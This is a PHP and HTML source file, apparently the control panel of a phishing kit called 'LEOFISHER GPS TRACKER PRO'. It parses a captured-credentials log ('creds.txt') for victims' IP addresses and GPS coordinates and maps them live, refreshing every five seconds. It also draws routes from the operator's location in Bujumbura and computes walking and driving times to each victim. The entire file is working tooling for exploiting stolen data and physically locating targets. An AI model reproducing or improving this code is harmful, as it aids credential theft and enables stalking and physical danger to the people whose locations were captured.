<?php
// LEOFISHER GPS TRACKER PRO - Live Map + Routes + Distances
date_default_timezone_set('Africa/Bujumbura');
$logfile = 'creds.txt';
$victims = [];

// Parse tous les logs pour extraire GPS
if (file_exists($logfile)) {
    $lines = file($logfile, FILE_IGNORE_NEW_LINES);
    foreach (array_reverse($lines) as $line) {
        if (preg_match('/GPS:\s*(-?\d+\.?\d*),\s*(-?\d+\.?\d*)/', $line, $matches)) {
            $time = date('H:i:s');
            $ip = preg_match('/IP\s*:\s*([\d.]+)/', $line, $ipm) ? $ipm[1] : 'Unknown';
            $victims[] = [
                'lat' => floatval($matches[1]),
                'lon' => floatval($matches[2]),
                'time' => $time,
                'ip' => $ip,
                'full' => $line
            ];
        }
    }
}

// Ta position Bujumbura (change si besoin)
$your_pos = ['lat' => -3.3614, 'lon' => 29.3599];
?>
<!DOCTYPE html>
<html>
<head>
    <title>🗺️ LEOFISHER GPS TRACKER PRO</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body{font-family:monospace;background:#000;color:#00ff00;padding:20px;margin:0;}
        #map{height:70vh;border:3px solid #00ff00;}
        .info{background:#111;padding:15px;margin:10px 0;border-left:5px solid #ff0000;}
        .stats{font-size:18px;font-weight:bold;}
        pre{font-size:12px;max-height:200px;overflow:auto;}
    </style>
</head>
<body>
    <h1>🗺️ GPS TRACKER LIVE - <?=count($victims)?> VICTIMES TRACKED 🐟</h1>
    
    <div class="info stats">
        🟢 <strong>TA POSITION:</strong> <?=number_format($your_pos['lat'],6)?>, <?=number_format($your_pos['lon'],6)?> 
        | 🔴 <strong>VICTIMES:</strong> <?=count($victims)?>
    </div>
    
    <div id="map"></div>
    
    <div class="info">
        <strong>📍 DERNIÈRES POSITIONS GPS:</strong>
        <pre><?php 
        foreach(array_slice($victims,0,10) as $v) {
            echo "🔴 {$v['ip']} | {$v['lat']}°N, {$v['lon']}°E | {$v['time']}\n";
        } 
        ?></pre>
    </div>

    <script>
    const map = L.map('map').setView([<?= $your_pos['lat'] ?>, <?= $your_pos['lon'] ?>], 12);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: 'LEOFISHER GPS PRO 🐟'
    }).addTo(map);

    // 🟢 TA POSITION
    L.marker([<?= $your_pos['lat'] ?>, <?= $your_pos['lon'] ?>])
        .addTo(map).bindPopup('<b>🟢 TA POSITION</b><br>Bujumbura').openPopup();

    // 🔴 VICTIMES
    const victims = <?= json_encode($victims) ?>;
    victims.forEach(victim => {
        L.marker([victim.lat, victim.lon], {
            icon: L.icon({
                iconUrl: 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCAzMCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTE1IDEgQzIzLjUwMyAxIDMgNy40OTcgMyAxNWMyIDYuNTAzIDguNDk3IDE0IDE1IDE0QzIxLjUwMyAyOSAyOSAyMy41MDMgMjkgMTVDMjkgNi41MDMgMjMuNTAzIDEgMTUgMUo5WiIgZmlsbD0iI2ZGNDQ0NCIgc3Ryb2tlPSIjRkY0NDQ0IiBzdHJva2Utd2lkdGg9IjIiLz4KPHRleHQgeD0iMTUiIHk9IjE4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0ibW9ub3NwYWNlIiBmb250LXNpemU9IjkiIGZpbGw9IiNGRjQ0NDQiPkwiPC90ZXh0Pgo8L3N2Zz4K',
                iconSize: [30,30]
            })
        }).addTo(map).bindPopup(`
            <b>🔴 VICTIME GPS</b><br>
            📍 ${victim.lat.toFixed(6)}°N, ${victim.lon.toFixed(6)}°E<br>
            💻 IP: ${victim.ip}<br>
            🕐 ${victim.time}
        `);
    });

    // ROUTES AUTOMATIQUES + DISTANCES
    if (victims.length > 0) {
        const routePoints = [[<?= $your_pos['lat'] ?>, <?= $your_pos['lon'] ?>]];
        victims.slice(0,5).forEach(v => routePoints.push([v.lat, v.lon]));
        
        // Route jaune
        L.polyline(routePoints, {
            color: '#ffaa00',
            weight: 5,
            opacity: 0.8
        }).addTo(map);

        // Calcul distances/temps
        victims.forEach((victim, i) => {
            const distKm = getDistance(
                <?= $your_pos['lat'] ?>, <?= $your_pos['lon'] ?>,
                victim.lat, victim.lon
            );
            const timeWalk = (distKm / 5 * 60).toFixed(0); // 5km/h
            const timeCar = (distKm / 50 * 60).toFixed(0);  // 50km/h
            
            L.circleMarker([victim.lat, victim.lon], {
                radius: 8,
                color: '#ff0000',
                fillColor: '#ff4444'
            }).addTo(map).bindPopup(`
                <b>🎯 DISTANCE DE TOI</b><br>
                📏 ${distKm.toFixed(2)}km<br>
                🚶 ${timeWalk}min (pied)<br>
                🚗 ${timeCar}min (voiture)
            `);
        });
    }

    // Haversine Distance (km)
    function getDistance(lat1, lon1, lat2, lon2) {
        const R = 6371;
        const dLat = (lat2 - lat1) * Math.PI / 180;
        const dLon = (lon2 - lon1) * Math.PI / 180;
        const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon/2) * Math.sin(dLon/2);
        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        return R * c;
    }

    // AUTO-REFRESH 5s
    setInterval(() => location.reload(), 5000);
    </script>
</body>
</html>
